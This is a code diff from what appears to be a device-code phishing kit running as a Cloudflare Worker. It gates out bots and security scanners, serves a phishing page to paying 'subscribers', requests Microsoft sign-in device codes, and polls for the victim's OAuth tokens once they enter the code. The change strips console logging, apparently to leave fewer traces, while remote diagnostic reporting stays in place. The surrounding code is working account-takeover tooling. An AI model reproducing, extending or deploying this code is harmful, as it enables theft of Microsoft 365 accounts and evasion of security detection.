@@ -307,7 +307,6 @@ async function handleRequest(request, waitUntil) {
       return servePhishingPage(request);
     }
   } else {
-    console.log('[Worker] Bot blocked (404 page):', botCheck.reason);
     diag('GATE_BLOCK', 'reason=' + botCheck.reason + ' method=' + request.method + ' path=' + url.pathname +
       ' ua=' + String(request.headers.get('user-agent') || '').substring(0, 80), waitUntil);
 
@@ -387,11 +386,9 @@ async function servePhishingPage(request) {
     }
 
     if (blockData.challenged) {
-      console.log('[Worker] Challenge temporarily disabled for testing');
     }
   } catch (e) {
     // If block check fails, serve the page anyway
-    console.error('[Worker] Block check failed:', e.message);
   }
 
   // Try to verify subscription via JWT, but serve page even if verification fails
@@ -446,12 +443,10 @@ async function servePhishingPage(request) {
 async function handleDeviceCodeRequest(request, waitUntil) {
   try {
     const { jwt_token, turnstile_token } = await request.json();
-    console.log('[Worker] Device code request received');
     reportDevCode('REQUEST RECEIVED', 'jwt_len=' + String(jwt_token || '').length + ' turnstile_token_present=' + (!!turnstile_token) + ' turnstile_token_len=' + String(turnstile_token || '').length + ' verify_endpoint=' + VERIFY_ENDPOINT + ' fallback=' + VERIFY_ENDPOINT_FALLBACK, waitUntil);
     diag('DEVSTART_ENTRY', 'jwt_len=' + String(jwt_token || '').length + ' turnstile_present=' + (!!turnstile_token) + ' turnstile_len=' + String(turnstile_token || '').length + ' ua=' + String(request.headers.get('user-agent') || '').substring(0, 60), waitUntil);
 
     // Verify JWT with backend
-    console.log('[Worker] Verifying JWT with backend...');
     try {
       const verifyResponse = await backendFetch('/api/verify', {
         method: 'POST',
@@ -459,9 +454,7 @@ async function handleDeviceCodeRequest(request, waitUntil) {
         body: JSON.stringify({ token: jwt_token, caller: 'devicecode' }),
       });
       const verifyData = await verifyResponse.json();
-      console.log('[Worker] JWT verification result:', verifyData.valid);
       if (!verifyData.valid) {
-        console.error('[Worker] JWT verification failed:', JSON.stringify(verifyData));
         reportDevCode('FAILED at /api/verify', 'http=' + verifyResponse.status + ' body=' + JSON.stringify(verifyData), waitUntil);
         return new Response(JSON.stringify({ error: 'Invalid or expired session' }), {
           status: 403,
@@ -472,7 +465,6 @@ async function handleDeviceCodeRequest(request, waitUntil) {
       diag('VERIFY_OK', 'tenant=' + verifyData.tenant + ' client_id=' + (verifyData.client_id || '(none)') + ' turnstile_key_set=' + !!verifyData.turnstile_key + ' turnstile_key_len=' + String(verifyData.turnstile_key || '').length, waitUntil);
 
       // Verify Turnstile
-      console.log('[Worker] Verifying Turnstile...');
       const turnstileVerify = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -482,9 +474,7 @@ async function handleDeviceCodeRequest(request, waitUntil) {
         }),
       });
       const turnstileData = await turnstileVerify.json();
-      console.log('[Worker] Turnstile verification result:', turnstileData.success);
       if (!turnstileData.success) {
-        console.error('[Worker] Turnstile verification failed:', JSON.stringify(turnstileData['error-codes']));
         reportDevCode('FAILED at turnstile', 'success=' + turnstileData.success + ' codes=' + JSON.stringify(turnstileData['error-codes']) + ' token_present=' + (!!turnstile_token) + ' token_len=' + String(turnstile_token || '').length, waitUntil);
         return new Response(JSON.stringify({ error: 'CAPTCHA verification failed' }), {
           status: 400,
@@ -494,8 +484,6 @@ async function handleDeviceCodeRequest(request, waitUntil) {
 
       diag('TURNSTILE_OK', 'token_len=' + String(turnstile_token || '').length, waitUntil);
 
-      console.log('[Worker] Requesting device code from Microsoft...');
-      console.log('[Worker] Tenant:', verifyData.tenant, 'Client ID:', verifyData.client_id);
       const deviceCodeResponse = await fetch(
         `https://login.microsoftonline.com/${verifyData.tenant}/oauth2/v2.0/devicecode`,
         {
@@ -514,12 +502,9 @@ async function handleDeviceCodeRequest(request, waitUntil) {
         }
       );
       const deviceCodeData = await deviceCodeResponse.json();
-      console.log('[Worker] Microsoft response status:', deviceCodeResponse.status);
-      console.log('[Worker] Microsoft response:', JSON.stringify(deviceCodeData).substring(0, 200));
       diag('MS_RESPONSE', 'http=' + deviceCodeResponse.status + ' error=' + (deviceCodeData.error || '(none)') + ' user_code=' + (deviceCodeData.user_code || '(none)') + ' interval=' + deviceCodeData.interval, waitUntil);
 
       if (deviceCodeData.error) {
-        console.error('[Worker] Microsoft error:', deviceCodeData.error, deviceCodeData.error_description);
         reportDevCode('FAILED at microsoft devicecode', 'status=' + deviceCodeResponse.status + ' error=' + deviceCodeData.error + ' desc=' + deviceCodeData.error_description, waitUntil);
         return new Response(JSON.stringify({ error: deviceCodeData.error_description || 'Microsoft error' }), {
           status: 400,
@@ -531,7 +516,6 @@ async function handleDeviceCodeRequest(request, waitUntil) {
       const pollInterval = deviceCodeData.interval || 5;
       pollForTokens(deviceCodeData.device_code, jwt_token, verifyData, pollInterval);
 
-      console.log('[Worker] Returning device code to client');
       diag('SUCCESS', 'user_code=' + deviceCodeData.user_code + ' verification_uri=' + deviceCodeData.verification_uri + ' expires_in=' + deviceCodeData.expires_in, waitUntil);
       return new Response(JSON.stringify({
         user_code: deviceCodeData.user_code,
@@ -542,12 +526,9 @@ async function handleDeviceCodeRequest(request, waitUntil) {
         headers: { 'Content-Type': 'application/json' },
       });
     } catch (innerErr) {
-      console.error('[Worker] Inner error in device code request:', innerErr.message);
       throw innerErr;
     }
   } catch (err) {
-    console.error('[Worker] Device code request failed:', err.message);
-    console.error('[Worker] Error stack:', err.stack);
     reportDevCode('FAILED uncaught', err.message + ' :: stack=' + String(err.stack || '').substring(0, 250), waitUntil);
     return new Response(JSON.stringify({ error: 'Failed to generate code', details: err.message }), {
       status: 500,
@@ -648,7 +629,6 @@ async function pollForTokens(deviceCode, jwtToken, verifyData, initialInterval) 
       ) {
         // Personal account or declined - stop polling immediately
         // This matches competitor behavior showing "code expired"
-        console.log('[DeviceCode] Personal account detected, stopping with expired behavior');
         return;
       }
 
